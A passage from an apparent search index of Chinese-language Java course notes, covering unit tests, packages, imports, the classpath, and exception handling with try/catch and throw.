Value(1)).evaluate() == 2);\n        assertTrue(new Add(new Value(1), new Value(2)).evaluate() == 3);\n        assertTrue(new Add(new Value(3), new Value(-3)).evaluate() == 0);\n    }\n\n    void testMultiplication() {\n        assertTrue(new Multiply(new Value(1), new Value(1)).evaluate() == 1);\n        assertTrue(new Multiply(new Value(1), new Value(2)).evaluate() == 2);\n        assertTrue(new Multiply(new Value(3), new Value(-3)).evaluate() == -9);\n    }\n\n    void testMixed() {\n        assertTrue(new Add(new Multiply(new Value(1), new Value(1)), new Multiply(new Value(1), new Value(2)))\n                .evaluate() == 3);\n        assertTrue(new Multiply(new Add(new Value(1), new Value(2)), new Add(new Value(3), new Value(4)))\n                .evaluate() == 21);\n    }\n\n    @Override\n    public void runAllTests() {\n        testAddition();\n        testMultiplication();\n        testMixed();\n    }\n\n    // \u6dfb\u52a0 main \u65b9\u6cd5\u4ee5\u4fbf\u76f4\u63a5\u8fd0\u884c\n    public static void main(String[] args) {\n        ExpressionTest tester = new ExpressionTest();\n        tester.runAllTests();\n    }\n}\n</code></pre> <pre><code>javac ExpressionTest.java SimpleUnitTest.java\njava ExpressionTest\n</code></pre>"},{"location":"cs/java/basics/w7/#packages","title":"Packages","text":"<p>\u8981\u662f\u597d\u591a\u7a0b\u5e8f\u5458\u5728\u4e00\u5757\u513f\u641e\u4e2a\u5927\u9879\u76ee\uff0c\u540d\u5b57\u649e\u8f66\u662f\u96be\u514d\u7684\u3002Java \u5141\u8bb8\u4e24\u4e2a\u7c7b\u6709\u4e0d\u540c\u7684\u540d\u5b57\uff0c\u53ea\u8981\u5b83\u4eec\u5728\u4e0d\u540c\u7684 namespace \u91cc\u5c31\u884c\u3002\u7528\u5305\u6765\u89e3\u51b3\u95ee\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u4e00\u4e9b\u76f8\u5173\u7684\u7c7b\u653e\u5728\u4e00\u8d77\uff0c\u5f04\u6210\u5305\u3002\u5230\u73b0\u5728\u4e3a\u6b62\uff0c\u54b1\u4eec\u4e00\u76f4\u7528\u7684\u5c31\u662f\u4e00\u4e2a\u5305\uff1a\u9ed8\u8ba4\u5305\u3002\u6bcf\u4e2a\u5305\u90fd\u662f\u4e00\u4e2a\u65b0\u547d\u540d\u7a7a\u95f4\u3002 </p> <ul> <li>\u5305\u57fa\u672c\u4e0a\u5c31\u662f\u4e00\u4e2a\u547d\u540d\u7a7a\u95f4\u91cc\u7684\u7c7b\u96c6\u5408\u3002</li> <li>\u5b83\u5c01\u88c5\u4e86\u4e00\u7ec4\u7c7b\u3002</li> <li>\u5c31\u50cf\u662f\u4e00\u4e2a\u5143\u7ea7\u522b\u7684\u7c7b\u3002</li> </ul> <p>\u8981\u628a\u4e00\u4e2a\u7c7b\u653e\u5728\u4e00\u4e2a\u5305\u91cc\uff0c\u4f60\u5f97\u505a\u4e24\u4ef6\u4e8b\u513f\uff1a</p> <p>\u7b2c\u4e00\uff0c\u5728 <code>.java</code> \u6587\u4ef6\u9876\u90e8\u5199\u4e0a\u5305\u540d <code>pkgname;</code></p> <p>\u7b2c\u4e8c\uff0c\u628a\u7c7b\u653e\u5728\u4e00\u4e2a\u548c\u5305\u540d\u4e00\u6837\u7684\u6587\u4ef6\u5939\u91cc\uff1a<code>/path/to/project/pkgname/</code></p> <pre><code>package pkga;\n\npublic class MyClass {\n    public static void main(String[] args) {\n        System.out.println(\"MyClass\");\n    }\n}\n</code></pre> <p>\u5047\u8bbe\u4f60\u5df2\u7ecf\u5728\u4f60\u60f3\u5b58\u653e\u9879\u76ee\u7684\u76ee\u5f55\u91cc\uff1a\u6bd4\u5982\uff0c<code>Lecture13/</code> \u8fd9\u4e2a\u76ee\u5f55\uff09</p> <ul> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>javac Lecture13/MyClass.java</code> \u6765\u7f16\u8bd1 <code>MyClass</code></li> <li>\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 <code>java Lecture13.MyClass</code> \u6765\u8fd0\u884c\u5b83</li> <li>\u6211\u4eec\u7528\u70b9\u6765\u8bbf\u95ee\u5305\u91cc\u9762\u7684\u7c7b</li> </ul> <p>\u5982\u679c\u6211\u4eec\u5fd8\u4e86\u5199\u5305\u540d\uff0c\u5c31\u4f1a\u51fa\u9519\u4e86\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u76ee\u5f55\u540d\u548c\u5305\u540d\u5f97\u5bf9\u5f97\u4e0a</p> <p>Java \u4f1a\u53bb\u5bf9\u5e94\u7684\u76ee\u5f55\u91cc\u627e\u5305\uff0c\u5982\u679c\u4f60\u7684\u7c7b\u4e0d\u5728\u90a3\u91cc\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u5d29\u6e83\u4e86\u3002</p> <p>\u5982\u679c\u9879\u76ee\u6709\u591a\u5c42\u6587\u4ef6\u5939\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u91cd\u53e0\u4f7f\u7528\uff1a</p> <pre><code>package pkgb.subpackage1;\n\npublic class MyClass {\n    public static void main(String[] args) {\n        System.out.println(\"MyClass #2\");\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w7/#import","title":"<code>import</code>","text":"<p>\u5b9e\u4e60\u5199\u4ee3\u7801\u8fc7\u7a0b\u4e2d Java \u81ea\u52a8\u5bfb\u627e\u540c\u76ee\u5f55\u4ee3\u7801\uff0c\u5b50\u76ee\u5f55\u4ee3\u7801\u9700\u8981 <code>import</code>\uff0c<code>import</code> \u522b\u7684\u8def\u5f84\u7684\u5305\u4e5f\u53ef\u4ee5\u4f7f\u7528 <code>.</code> \u8bed\u6cd5</p> <pre><code>import pkg.subpkg.etc;\n</code></pre> <p>\u73b0\u5728\u4e3e\u4f8b\uff1a</p> <pre><code>Lecture13/\nLecture13/other directories...\nLecture13/vehicles/\nLecture13/vehicles/Bicycle.java\nLecture13/vehicles/Car.java\n</code></pre> <pre><code>import vehicles.Bicycle;\nimport vehicles.Car;\n</code></pre> <p>\u5982\u679c\u60f3\u76f4\u63a5\u4e00\u6b21\u6027\u5012\u5165\u5b8c\u6210\uff1a</p> <pre><code>import vehicles.*\n</code></pre> <p>\u6709\u65f6\u5019\u53ef\u80fd\u9700\u8981\u7ec4\u5408\uff1a</p> <pre><code>package pkgc;\nimport vehicles.*;\n</code></pre> <p>\u628a\u4ee3\u7801\u653e\u5230 <code>pkgc</code> \u76ee\u5f55\u91cc\u5e76\u4e0d\u4f1a\u6539\u53d8 <code>import</code> \u6587\u4ef6</p> <ul> <li><code>import</code> \u540e\u9762\u5199\u7684\u5305\u540d\u662f\u76f8\u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u73af\u5883\u7684\u201c\u7edd\u5bf9\u201d\u540d\u79f0\uff0c\u4e0d\u662f\u76f8\u5bf9\u4e8e\u4f60\u5f53\u524d\u6240\u5728\u7684\u5305<code>pkgc</code> \u7684\u201c\u76f8\u5bf9\u201d\u4f4d\u7f6e\u3002\u4e0d\u80fd\u5199\u6210 <code>import ../vehicles.*;</code></li> </ul> <ul> <li><code>import</code> \u8bed\u53e5\u544a\u8bc9 Java \u7f16\u8bd1\u5668\u548c\u8fd0\u884c\u65f6\uff08JVM\uff09\uff1a\u201c\u6211\u9700\u8981\u7528\u5230\u540d\u4e3a <code>vehicles</code> \u7684\u8fd9\u4e2a\u5305\u3002\u81f3\u4e8e\u8fd9\u4e2a\u540d\u4e3a <code>vehicles</code> \u7684\u5305\u5177\u4f53\u5728\u78c1\u76d8\u4e0a\u7684\u54ea\u4e2a\u4f4d\u7f6e\uff0c\u662f\u7531\u4f60\u542f\u52a8\u7a0b\u5e8f\u7684\u65b9\u5f0f\u548c\u7c7b\u8def\u5f84\uff08Classpath\uff09\u8bbe\u7f6e\u6765\u51b3\u5b9a\u7684\u3002</li> <li>\u4f60\u5e94\u8be5\u7ad9\u5728\u4f60\u9879\u76ee\u7684\u6700\u9876\u5c42\u76ee\u5f55\u6765\u6267\u884c <code>java</code> \u547d\u4ee4\u3002Java \u9ed8\u8ba4\u4f1a\u4ece\u4f60\u6267\u884c <code>java</code> \u547d\u4ee4\u7684\u90a3\u4e2a\u76ee\u5f55\u5f00\u59cb\uff0c\u6839\u636e\u4f60\u63d0\u4f9b\u7684\u201c\u5305\u540d.\u7c7b\u540d\u201d\uff08\u5982 <code>pkgc.VehicleExample</code>\uff09\u6765\u67e5\u627e\u5bf9\u5e94\u7684 <code>.class</code> \u6587\u4ef6\uff08\u67e5\u627e <code>pkgc</code> \u6587\u4ef6\u5939\u4e0b\u7684 <code>VehicleExample.class</code>\uff09\uff0c\u5b83\u4e0d\u4f1a\u81ea\u52a8\u5f80\u4e0a\u5c42\u76ee\u5f55\u67e5\u627e</li> </ul> <pre><code>.\n\u251c\u2500\u2500 pkgA\n\u2502   \u251c\u2500\u2500 Provider.class\n\u2502   \u2514\u2500\u2500 Provider.java\n\u2514\u2500\u2500 pkgB\n    \u251c\u2500\u2500 Consumer.class\n    \u2514\u2500\u2500 Consumer.java\n</code></pre> <pre><code>package pkgB; // Declares this class belongs to the 'pkgB' package\n\n// Import statement uses the 'absolute' package name 'pkgA'\n// It doesn't matter that Consumer.java is in pkgB.\n// We are telling Java: \"Find the package named 'pkgA' relative to the classpath root\".\nimport pkgA.Provider;\n\n// Trying something like 'import ../pkgA.Provider;' would be a compile-time error.\n// Java imports are not relative file paths.\n\npublic class Consumer {\n    public static void main(String[] args) {\n        System.out.println(\"Consumer starting in pkgB...\");\n        Provider myProvider = new Provider(); // Create an instance of the imported class\n        myProvider.offerService(); // Use the imported class\n        System.out.println(\"Consumer finishing in pkgB.\");\n    }\n}\n</code></pre> <pre><code>package pkgA; // Declares this class belongs to the 'pkgA' package\n\npublic class Provider {\n    public void offerService() {\n        System.out.println(\"  -&gt; Service offered by Provider in pkgA!\");\n    }\n}\n</code></pre> <pre><code>javac pkgB/Consumer.java\njava pkgB/Consumer\n</code></pre> <p>\u867d\u7136\u73b0\u4ee3\u7f16\u8bd1\u5668\u81ea\u52a8\u5b8c\u6210\u4e86\u8fd9\u4e9b\u4e8b</p>"},{"location":"cs/java/basics/w7/#the-classpath","title":"The Classpath","text":"<ul> <li>\u6211\u4eec\u8fd0\u884c <code>Java</code> \u7a0b\u5e8f\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u627e\u90a3\u4e9b\u653e\u5728\u5b50\u76ee\u5f55\u91cc\u7684\u5305</li> <li>\u6bcf\u6b21 <code>Java</code> \u770b\u5230 <code>import</code> \u8bed\u53e5\uff0c\u5b83\u5c31\u4f1a\u4ece\u5f53\u524d\u76ee\u5f55\u5f00\u59cb\uff0c\u5f80\u5bf9\u5e94\u7684\u5b50\u76ee\u5f55\u91cc\u627e</li> <li>\u4f60\u8fd8\u53ef\u4ee5\u544a\u8bc9 <code>Java</code> \u53bb\u5176\u4ed6\u5730\u65b9\u627e\u5305</li> <li>\u5b83\u4f1a\u68c0\u67e5\u5728 <code>classpath</code> \u91cc\u6307\u5b9a\u7684\u6240\u6709\u76ee\u5f55</li> <li>\u4f60\u53ef\u4ee5\u4fee\u6539 <code>classpath</code></li> </ul>"},{"location":"cs/java/basics/w7/#java-api","title":"Java API","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b <code>classpath</code>\u81ea\u52a8\u641c\u7d22\u5305\u542b\u5f53\u524d\u8def\u5f84\uff0c\u4e5f\u4f1a\u641c\u7d22 Java API </p> <pre><code>import java.util.Scanner;\n</code></pre> <p>https://docs.oracle.com/en/java/javase/11/docs/api/java.base/module-summary.html</p> <p><code>java.lang</code> \u5305\u91cc\u5934\u6709 <code>String</code> \u548c <code>Object</code> \u8fd9\u6837\u7684\u7c7b\u88ab\u9ed8\u8ba4\u5bfc\u5165\uff0c\u548c\u9ed8\u8ba4\u5305\u91cc\u7684\u6240\u6709\u4e1c\u897f\u4e00\u8d77\u81ea\u52a8\u5bfc\u5165\u3002</p>"},{"location":"cs/java/basics/w7/#adding-to-the-classpath","title":"Adding to the Classpath","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u6539\u6362\u7c7b\u8def\u5f84\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a <code>--class-path</code> \u6807\u5fd7</p> <ul> <li>\u53ef\u4ee5\u7528\u5192\u53f7 <code>:</code> \u5206\u9694\u6765\u6307\u5b9a\u591a\u4e2a\u76ee\u5f55</li> <li><code>javac --class-path=path/to/package:path/to/other/package</code>.</li> <li><code>java --class-path=path/to/package:path/to/other/package</code></li> <li>\u5728 Windows \u7cfb\u7edf\u91cc\uff0c\u76ee\u5f55\u8def\u5f84\u8981\u7528\u53cd\u659c\u6760</li> <li>\u522b\u5fd8\u4e86\u628a\u5f53\u524d\u76ee\u5f55\u4e5f\u52a0\u4e0a\uff0c<code>--class-path=some/path:.</code></li> <li>\u901a\u5e38 IDE \u4f1a\u5e2e\u4f60\u5904\u7406\u8fd9\u4e2a\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u540c\u6837\u7684\u65b9\u6cd5\u4fee\u6539 <code>CLASSPATH</code> \u73af\u5883\u53d8\u91cf</li> </ul> <p>\u6bd4\u5982\u4e3a\u4e86\u6267\u884c\u4e00\u4e2a\u4f9d\u8d56\u4e24\u4e2a\u4e0d\u540c\u76ee\u5f55\u7684\u6587\u4ef6</p> <pre><code>.\n\u251c\u2500\u2500 Lecture13\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 ClasspathExample.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkga\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 NoPackage.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkgb\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u251c\u2500\u2500 subpackage1\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 subpackage2\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0     \u2514\u2500\u2500 MyClass.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 pkgc\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 VehicleExample.java\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 VehicleExample.java\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 vehicles\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Bicycle.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Boat.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 Car.java\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 extra_vehicles\n\u2502\u00a0\u00a0     \u2502\u00a0\u00a0 \u2514\u2500\u2500 Kayak.java\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 MotorBoat.java\n\u2514\u2500\u2500 Lecture13_Extra\n    \u2514\u2500\u2500 pkgd\n        \u2514\u2500\u2500 Greeter.java\n</code></pre> <pre><code>javac --class-path=../Lecture13 Extra/:. ClasspathExample.java\njava --class-path=../Lecture13 Extra/:. ClasspathExample\n</code></pre> <p>\u5728 Lecture13 \u6587\u4ef6\u5939\u4e2d\uff0c\u90a3\u4e48\u8fd9\u6837\u5bfb\u627e\u81ea\u5df1\u5f53\u524d\u76ee\u5f55\u4e0b\u5b50\u5305\u7684\u540c\u65f6\u8fd8\u6db5\u76d6\u4e86\u53e6\u5916\u4e00\u4e2a\u6587\u4ef6\u5939\u7684</p> <p>\u53e6\u5916\u5305\u53ef\u4ee5\u88ab\u7f16\u8f91\u4e3a <code>.jar</code> \u6587\u4ef6\uff0c\u4e5f\u5c31\u662f Java Archive</p> <p>https://docs.oracle.com/javase/tutorial/deployment/jar/basicsindex.html</p> <p>\u4e00\u6837\u53ef\u4ee5\u88ab\u6dfb\u52a0\u8fdb <code>classpath</code></p> <pre><code>javac --class-path=path/to/mypackage.jar\n</code></pre>"},{"location":"cs/java/basics/w7/#packages-and-access-modifiers","title":"Packages and Access Modifiers","text":"<p>\u4efb\u4f55\u5b50\u7c7b\u90fd\u53ef\u4ee5\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u6210\u5458\uff0c\u5373\u4f7f\u8fd9\u4e2a\u5b50\u7c7b\u5728\u53e6\u4e00\u4e2a\u5305\u91cc\u3002</p> <p>\u5982\u679c\u4f60\u60f3\u8ba9\u4eba\u5bb6\u80fd\u6269\u5c55\u4f60\u7684\u7c7b\u5e76\u4e14\u4f7f\u7528\u91cc\u9762\u7684\u6210\u5458\uff0c\u5c31\u628a\u5b83\u8bbe\u7f6e\u4e3a\u53d7\u4fdd\u62a4\u7684\uff0c\u5426\u5219\u5c31\u8bbe\u7f6e\u6210\u9ed8\u8ba4</p>"},{"location":"cs/java/basics/w8/","title":"8.0 Exceptions, Interfaces","text":""},{"location":"cs/java/basics/w8/#exceptions","title":"Exceptions","text":"<p>\u62fc\u5199\u9519\u8bef\u7684\u53d8\u91cf\u540d\uff0c\u8bbf\u95ee\u6570\u7ec4\u8d8a\u754c <code>java.lang.ArrayIndexOutOfBoundsException</code></p> <p>\u7a0b\u5e8f\u4f1a \u201c\u629b\u51fa\u201d \u4e00\u4e2a\u5f02\u5e38\uff0c\u6211\u4eec\u53ef\u4ee5\u201c\u6355\u83b7\u201d\u8fd9\u4e2a\u5f02\u5e38\u5e76\u5904\u7406\u5b83\uff0c\u9632\u6b62\u7a0b\u5e8f\u5d29\u6e83</p>"},{"location":"cs/java/basics/w8/#try-catch","title":"Try Catch","text":"<pre><code>import java.util.Scanner;\n\npublic class ArrayTryCatch {\n    public static void main(String[] args) {\n        int[] a = { 882, 2, 11 };\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"Enter index: \");\n        int index = sc.nextInt();\n        try {\n            System.out.println(a[index]);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught ArrayIndexOutOfBoundsException\");\n        }\n    }\n}\n</code></pre> <pre><code>try {\n// some code\n} catch (ExceptionType exception) {\n// handle the exception\n}\n</code></pre> <p>\u53ea\u8981\u6293\u4f4f\u6570\u7ec4\u8d8a\u754c\u8fd9\u4e2a\u9519\u8bef\u7c7b\u578b\uff0c\u90a3\u4e48\u5c31\u6253\u5370\u9519\u8bef\u5230\u5c4f\u5e55</p> <ul> <li>\u4ee3\u7801\u7b2c\u516b\u884c\u53ef\u4ee5\u770b\u5230\u9700\u8981\u8f93\u5165\u7684\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u90a3\u4e48\u53ef\u80fd\u6293\u4e0d\u5230 <code>InputMismatchException</code> \u7c7b\u578b\u7684\u9519\u8bef\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u5d29\u6e83</li> </ul> <pre><code>import java.util.Scanner;\n\nimport java.util.InputMismatchException;\n\npublic class ArrayTryCatch2 {\n    public static void main(String[] args) {\n        int[] a = { 882, 2, 11 };\n        Scanner sc = new Scanner(System.in);\n        System.out.print(\"Enter index: \");\n        try {\n            int index = sc.nextInt();\n            System.out.println(a[index]);\n        } catch (ArrayIndexOutOfBoundsException e) {\n            System.out.println(\"Caught ArrayIndexOutOfBoundsException\");\n        } catch (InputMismatchException e) {\n            System.out.println(\"Please enter a valid integer next time\");\n        }\n    }\n}\n</code></pre> <p>\u56e0\u6b64\u53ef\u4ee5\u5199\u591a\u4e2a catch \u6355\u6349</p>"},{"location":"cs/java/basics/w8/#exception-control-flow","title":"Exception Control Flow","text":"<pre><code>public class Example {\n\n    // \u5de5\u4eba B \u7684\u5de5\u4f5c\uff1a\u5c1d\u8bd5\u505a\u9664\u6cd5\n    public static void workerB(int x) {\n        System.out.println(\"Worker B starts working...\");\n        int result = 10 / x; // &lt;--- \u8fd9\u91cc\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\uff01\n        System.out.println(\"Worker B calculated result: \" + result);\n        System.out.println(\"Worker B finished working.\");\n    }\n\n    // \u5de5\u5934 A \u7684\u5de5\u4f5c\uff1a\u8ba9\u5de5\u4eba B \u53bb\u5de5\u4f5c\n    public static void workerA() {\n        System.out.println(\"Worker A starts supervising...\");\n        workerB(0); // &lt;--- \u8ba9 workerB \u53bb\u505a\u9664\u4ee5 0 \u7684\u8ba1\u7b97\n        System.out.println(\"Worker A finished supervising.\");\n    }\n\n    // \u8001\u677f main \u7684\u5de5\u4f5c\uff1a\u8ba9\u5de5\u5934 A \u53bb\u76d1\u7763\n    public static void main(String[] args) {\n        System.out.println(\"Main starts the project...\");\n        workerA();\n        System.out.println(\"Main finished the project.\");\n    }\n}\n</code></pre> <ul> <li>\u7cfb\u7edf\u53d1\u73b0\u8fd9\u4e2a <code>ArithmeticException</code> \u7684\u5f02\u5e38\u5bf9\u8c61\u629b\u51fa</li> <li><code>workerB</code> \u5728\u51fa\u9519\u7684\u90a3\u4e00\u884c\u7acb\u523b\u505c\u6b62\u6267\u884c\u3002<code>System.out.println(\"Worker B calculated result: \" + result);</code> \u8fd9\u4e00\u884c\u53ca\u4e4b\u540e\u7684\u4ee3\u7801\u4e0d\u4f1a**\u88ab\u6267\u884c\u3002</li> </ul> <ul> <li>\u5728 <code>workerB</code> \u65b9\u6cd5\u5185\u90e8\uff0c\u51fa\u9519\u7684\u8fd9\u884c\u4ee3\u7801 <code>int result = 10 / x;</code> \u6ca1\u6709\u88ab\u653e\u5728 <code>try...catch</code> \u5757\u91cc\u3002\u6240\u4ee5\uff0c<code>workerB</code> \u65b9\u6cd5\u65e0\u6cd5\u5904\u7406\u8fd9\u4e2a\u5f02\u5e38\uff0c\u5b83\u7acb\u5373\u7ec8\u6b62\u4e86\u3002</li> </ul> <ul> <li>\u5f02\u5e38\u5411\u4e0a\u4f20\u9012\uff0c\u4f20\u9012\u7ed9 14 \u884c\u53d1\u73b0\u4e5f\u6ca1\u6709 <code>try catch</code> \u5757\u5f02\u5e38\u5904\u7406\u4e5f\u7acb\u5373\u7ec8\u6b62\uff0c\u5f02\u5e38\u7ee7\u7eed\u5411\u4e0a\u4f20\u9012\uff0c\u4f20\u7ed9\u8c03\u7528 <code>WorkA</code> \u7684\u65b9\u6cd5\u4e5f\u5c31\u662f <code>main</code> \u6700\u540e\u53d1\u73b0\u8fd8\u662f\u6ca1\u6709\u5f02\u5e38\u5904\u7406\u5757\uff0c\u56e0\u6b64\u8fd9\u4e9b\u6253\u5370\u8bed\u53e5\u5747\u4e0d\u4f1a\u88ab\u6267\u884c\u90fd\u7acb\u5373\u7ec8\u6b62\u4e86\uff0cJVM \u4f1a\u7ec8\u6b62\u6574\u4e2a\u7a0b\u5e8f\u7684\u8fd0\u884c</li> </ul> <p>\u60f3\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u5728 A \u5904\u6dfb\u52a0\u5f02\u5e38\u5904\u7406\u5373\u53ef</p> <pre><code>public class ExampleFixed {\n\n    public static void workerB(int x) {\n        System.out.println(\"Worker B starts working...\");\n        // \u8fd9\u884c\u4ecd\u7136\u53ef\u80fd\u629b\u51fa ArithmeticException\n        int result = 10 / x;\n        System.out.println(\"Worker B calculated result: \" + result);\n        System.out.println(\"Worker B finished working.\");\n    }\n\n    public static void workerA() {\n        System.out.println(\"Worker A starts supervising...\");\n        try {\n            // \u628a\u53ef\u80fd\u51fa\u9519\u7684\u8c03\u7528\u653e\u8fdb try \u5757\n            workerB(0);\n        } catch (ArithmeticException e) {\n            // \u5982\u679c workerB \u629b\u51fa\u4e86 ArithmeticException\uff0c\u8fd9\u91cc\u4f1a\u6355\u83b7\u5b83\n            System.out.println(\"Worker A caught an issue: \" + e.getMessage());\n        }\n        // \u56e0\u4e3a\u5f02\u5e38\u88ab catch \u5904\u7406\u4e86\uff0c\u7a0b\u5e8f\u4f1a\u7ee7\u7eed\u6267\u884c catch \u540e\u9762\u7684\u4ee3\u7801\n        System.out.println(\"Worker A finished supervising.\");\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Main starts the project...\");\n        workerA(); // \u8c03\u7528 workerA\n        System.out.println(\"Main finished the project.\"); // \u8fd9\u884c\u73b0\u5728\u4f1a\u88ab\u6267\u884c\u4e86\uff01\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#exceptions-and-inheritance","title":"Exceptions and Inheritance","text":"<p>\u6211\u4eec\u9700\u8981\u53bb\u51b3\u5b9a\u6293\u4f4f\u9519\u8bef\u540e\u9700\u8981\u5e72\u4e9b\u4ec0\u4e48\uff0c\u6709\u65f6\u5019\u6253\u5370\u5c31\u591f\u4e86\uff0c\u6709\u65f6\u5019\u9700\u8981\u8981\u6c42\u91cd\u8f93\u5165\u7b49</p> <p>\u53e6\u5916\u5f02\u5e38\u4e5f\u50cf \u201c\u5bb6\u65cf\u201d \u4e00\u6837\u6709\u7ee7\u627f\u5173\u7cfb</p> <p>\u6709\u4e00\u4e2a\u6700\u8001\u7684\u7956\u5148\uff0c\u53eb\u505a <code>Throwable</code> (\u4ee3\u8868\u6240\u6709\u80fd\u88ab\u629b\u51fa\u7684\u95ee\u9898)\u3002\u5176\u6709\u4e24\u4e2a\u5206\u652f</p> <ul> <li><code>Error</code> </li> <li>\u901a\u5e38\u662f JVM \u5185\u90e8\u9519\u8bef\u6216\u8d44\u6e90\u8017\u5c3d\u7b49\u4e25\u91cd\u95ee\u9898\uff0c\u7a0b\u5e8f\u4e00\u822c\u6ca1\u6cd5\u5904\u7406\uff0c\u6bd4\u5982\u5185\u5b58\u6ea2\u51fa <code>OutOfMemoryError</code>\u3002\u6211\u4eec\u901a\u5e38\u4e0d <code>catch</code> \u8fd9\u4e2a</li> <li><code>Exception</code> \u4e0b\u9762\u53c8\u6709\u597d\u591a\u5206\u652f\uff08\u5b50\u7c7b\uff09\uff0c\u628a\u95ee\u9898\u5206\u7c7b\uff1a</li> <li><code>IOException</code></li> <li><code>RuntimeException</code></li> </ul> <p>\u56e0\u6b64 <code>catch (ExceptionType e)</code> \u4e0d\u4ec5\u80fd\u6355\u83b7\u6b63\u597d\u662f <code>ExceptionType</code> \u7c7b\u578b\u7684\u5f02\u5e38\uff0c\u8fd8\u80fd\u6355\u83b7\u6240\u6709 <code>ExceptionType</code> \u7684\u5b50\u7c7b\uff08\u6216\u5b59\u5b50\u7c7b\u7b49\u540e\u4ee3\uff09\u7c7b\u578b\u7684\u5f02\u5e38\u3002</p> <ul> <li><code>catch (FileNotFoundException e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u5c0f\u7f51\u773c\u7684\u7f51\uff0c\u4e13\u95e8\u7528\u6765\u6355\u635e\u201c\u6587\u4ef6\u627e\u4e0d\u5230\u201d\u8fd9\u79cd\u5177\u4f53\u7684\u9c7c\u3002</li> <li><code>catch (IOException e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u4e2d\u7b49\u7f51\u773c\u7684\u7f51\uff0c\u5b83\u53ef\u4ee5\u6355\u635e\u201c\u6587\u4ef6\u627e\u4e0d\u5230\u201d(<code>FileNotFoundException</code>) \u8fd9\u6761\u9c7c\uff0c\u4e5f\u80fd\u6355\u635e\u5176\u4ed6\u5404\u79cd I/O \u76f8\u5173\u7684\u9c7c\uff08\u6bd4\u5982 <code>SocketException</code>\uff09\uff0c\u56e0\u4e3a\u5b83\u4eec\u90fd\u5c5e\u4e8e\u201cIO\u9c7c\u201d\u8fd9\u4e2a\u5927\u7c7b\u3002</li> <li><code>catch (Exception e)</code>\uff1a\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u5927\u7684\u7f51\uff0c\u51e0\u4e4e\u53ef\u4ee5\u6355\u635e\u6240\u6709\u7a0b\u5e8f\u8fd0\u884c\u65f6\u53ef\u80fd\u9047\u5230\u7684\u3001\u53ef\u5904\u7406\u7684\u9c7c\uff08<code>IOException</code>, <code>RuntimeException</code> \u53ca\u5176\u6240\u6709\u5b50\u5b59\u540e\u4ee3\uff09\u3002</li> </ul> <p><code>catch</code> \u5757\u5229\u7528\u4e86\u7ee7\u627f\u7684\u591a\u6001\u6027\uff0c\u65e2\u53ef\u4ee5\u7cbe\u786e\u6355\u83b7\u7279\u5b9a\u7c7b\u578b\u7684\u9519\u8bef\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e00\u4e2a <code>catch</code> \u5757\u5904\u7406\u4e00\u7c7b\u76f8\u5173\u7684\u9519\u8bef\u3002</p>"},{"location":"cs/java/basics/w8/#throw","title":"<code>throw()</code>","text":"<p>\u6211\u4eec\u4f7f\u7528 <code>StringStack</code> \u6f14\u793a\uff0c<code>stack</code> \u662f\u6700\u5c0f\u7684\u6570\u636e\u7ed3\u6784 FILO</p> <pre><code>public class StringStack {\n    private String[] data;\n    private int top;\n\n    public StringStack(int capacity) { ... }\n    public void push(String s) { ... }\n    public String pop() { ... }\n}\n</code></pre>"},{"location":"cs/java/basics/w8/#stringstack","title":"<code>StringStack()</code>","text":"<pre><code>public StringStack(int capacity) {\n    data = new String[capacity];\n    top = 0;\n}\n</code></pre> <p>\u6784\u9020\u51fd\u6570\u7528\u5b57\u7b26\u4e32\u7ec4\u586b\u5145\u4e00\u5b9a\u5bb9\u91cf\uff0c<code>top</code> \u4ee3\u8868 stack \u9876\u90e8\u7d22\u5f15\uff0c\u968f\u7740 push \u6216 pop \u4f1a\u53d8\u52a8</p>"},{"location":"cs/java/basics/w8/#push","title":"<code>push()</code>","text":"<pre><code>public void push(String s) {\n    if (top == data.length) {\n        throw new RuntimeException(\"Stack is full\");\n    }\n    data[top++] = s;\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u7b2c\u4e09\u884c 